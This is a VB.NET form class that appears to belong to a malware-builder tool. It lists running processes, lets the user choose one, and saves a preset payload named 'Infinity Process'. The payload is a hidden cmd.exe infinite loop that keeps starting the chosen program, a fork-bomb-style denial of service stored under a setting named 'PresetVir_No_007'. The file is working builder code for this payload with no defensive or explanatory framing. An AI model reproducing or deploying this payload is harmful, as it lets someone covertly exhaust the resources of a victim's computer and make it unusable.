Public Class Options_06
    Private Sub Options_06_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        LogInNormalTextBox1.Text = My.Settings.ProcessKill_Process


        Dim process() As System.Diagnostics.Process

        process = System.Diagnostics.Process.GetProcesses()

        For Each processus As System.Diagnostics.Process In process
            LogInListBox1.AddItem(processus.ProcessName)
        Next
    End Sub

    Private Sub LogInButtonWithProgress2_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress2.Click
        FlatAlertBox1.Visible = True
        FlatAlertBox1.Text = LogInListBox1.SelectedItem.ToString + " ajouté !"
        LogInNormalTextBox1.Text = LogInListBox1.SelectedItem.ToString
    End Sub

    Private Sub LogInButtonWithProgress1_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress1.Click
        My.Settings.ProcessKill_Process = LogInNormalTextBox1.Text
        My.Settings.PresetVir_No_007 = "'=== Infinity Process ===
      Shell (" & Chr(34) & "cmd /c for /l %x in (0, 0, 0) do start " & LogInNormalTextBox1.Text & Chr(34) & ", vbHide)"
        Me.Close()
    End Sub


End Class